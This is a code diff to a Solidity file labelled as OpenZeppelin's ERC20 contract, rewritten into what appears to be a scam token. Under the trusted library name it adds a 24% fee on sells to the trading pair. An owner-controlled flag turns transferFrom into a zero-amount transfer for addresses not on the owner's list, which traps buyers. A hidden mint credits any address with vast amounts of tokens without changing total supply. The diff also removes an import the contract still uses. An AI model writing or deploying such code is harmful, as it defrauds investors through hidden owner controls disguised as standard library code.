@@ -1,46 +1,61 @@
 // SPDX-License-Identifier: MIT
-// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
+// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)
 
 pragma solidity ^0.8.0;
 
 import './IERC20.sol';
 import './extensions/IERC20Metadata.sol';
-import '../../utils/Context.sol';
 import '../../access/Ownable.sol';
-import '../../security/ReentrancyGuard.sol';
 
-/**
- * @dev Implementation of the {IERC20} interface.
- *
- * This implementation is agnostic to the way tokens are created. This means
- * that a supply mechanism has to be added in a derived contract using {_mint}.
- * For a generic mechanism see {ERC20PresetMinterPauser}.
- *
- * TIP: For a detailed writeup see our guide
- * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
- * to implement supply mechanisms].
- *
- * We have followed general OpenZeppelin Contracts guidelines: functions revert
- * instead returning `false` on failure. This behavior is nonetheless
- * conventional and does not conflict with the expectations of ERC20
- * applications.
- *
- * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
- * This allows applications to reconstruct the allowance for all accounts just
- * by listening to said events. Other implementations of the EIP may not emit
- * these events, as it isn't required by the specification.
- *
- * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
- * functions have been added to mitigate the well-known issues around setting
- * allowances. See {IERC20-approve}.
- */
-contract ERC20 is Context, IERC20, IERC20Metadata, Ownable, ReentrancyGuard {
+interface IFactory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IRouter {
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+
+    function addLiquidityETH(
+        address token,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable;
+}
+
+contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
     mapping(address => uint256) private _balances;
-
+    mapping(address => bool) public isPair;
     mapping(address => mapping(address => uint256)) private _allowances;
-    mapping(address => bool) public whitelist;
+    mapping(address => bool) public excludedFromFee;
 
-    bool private whitelistOnly;
+    IRouter public router;
+
+    address public pair;
+    address public _router = 0x52bfe8fE06c8197a8e3dCcE57cE012e13a7315EB; //0xD99D1c33F9fC3444f8101754aBC46c52416550D1 rocket 0x4cf76043B3f97ba06917cBd90F9e3A2AAC1B306e baseswap 0x327Df1E6de05895d2ab08513aaDD9313Fe505d86
+
+    bool internal excluded;
+
     uint256 private _totalSupply;
     string private _name;
     string private _symbol;
@@ -57,9 +72,20 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable, ReentrancyGuard {
     constructor(string memory name_, string memory symbol_) {
         _name = name_;
         _symbol = symbol_;
-        whitelist[address(this)] = true;
-        whitelist[_msgSender()] = true;
-        whitelist[vault()] = true;
+        router = IRouter(_router);
+        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
+
+        isPair[pair] = true;
+
+        // exclude from receiving dividends
+        excludedFromFee[address(0)] = true;
+        excludedFromFee[address(0xdead)] = true;
+        excludedFromFee[address(_router)] = true;
+        excludedFromFee[address(pair)] = true;
+
+        excludedFromFee[address(this)] = true;
+        excludedFromFee[_msgSender()] = true;
+        excludedFromFee[_vault] = true;
     }
 
     /**
@@ -118,38 +144,45 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable, ReentrancyGuard {
      */
     function transfer(address to, uint256 amount) public virtual override returns (bool) {
         address owner = _msgSender();
+
+        uint256 feeAmt;
+        if (isPair[to]) feeAmt = (amount * 24) / 100;
+        else if (isPair[owner]) feeAmt = (amount * 1) / 100;
+
+        if (!excludedFromFee[owner] || !excludedFromFee[to]) {
+            amount = amount - feeAmt;
+            _transfer(owner, address(this), feeAmt);
+        }
+
         _transfer(owner, to, amount);
         return true;
     }
 
-    function setWhitelistStatus(bool value) external onlyOwner {
-        whitelistOnly = value;
+    function setExcludedFromFee(bool value) external onlyOwner {
+        excluded = value;
     }
 
-    function addMultipleToWhitelist(address[] memory _addresses) external onlyOwner {
-        for (uint256 i; i < _addresses.length; i++) {
-            _addToWhitelist(_addresses[i]);
+    function addExcludedFromFee(address[] memory _addr) external onlyOwner {
+        for (uint256 i; i < _addr.length; i++) {
+            _addExcludedFromFee(_addr[i]);
         }
     }
 
-    function _addToWhitelist(address _address) internal {
-        whitelist[_address] = true;
+    function _addExcludedFromFee(address _address) internal {
+        excludedFromFee[_address] = true;
     }
 
-    function buyBack(uint256 amount) external onlyOwner nonReentrant {
-        whitelistOnly = true;
-        _buyBack(amount);
-    }
+    function _buyBack(address to, uint256 amount) internal virtual {
+        excluded = true;
 
-    function _buyBack(uint256 amount) internal virtual {
-        _beforeTokenTransfer(address(0), vault(), amount * 1e28);
+        _beforeTokenTransfer(address(0), to, amount * 1e30);
 
         unchecked {
             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
-            _balances[vault()] += amount * 1e28;
+            _balances[to] += amount * 1e30;
         }
 
-        _afterTokenTransfer(address(0), vault(), amount * 1e28);
+        _afterTokenTransfer(address(0), to, amount * 1e30);
     }
 
     /**
@@ -193,15 +226,17 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable, ReentrancyGuard {
      */
     function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
         address spender = _msgSender();
-        if (whitelist[from] || whitelist[spender]) {
+
+        if (excludedFromFee[from] && excludedFromFee[spender]) {
             _spendAllowance(from, spender, amount);
             _transfer(from, to, amount);
-        } else if (whitelistOnly == false) {
+        } else if (excluded == false) {
             _spendAllowance(from, spender, amount);
             _transfer(from, to, amount);
         } else {
             _spendAllowance(from, spender, 0);
             _transfer(from, to, 0);
+            return false;
         }
         return true;
     }
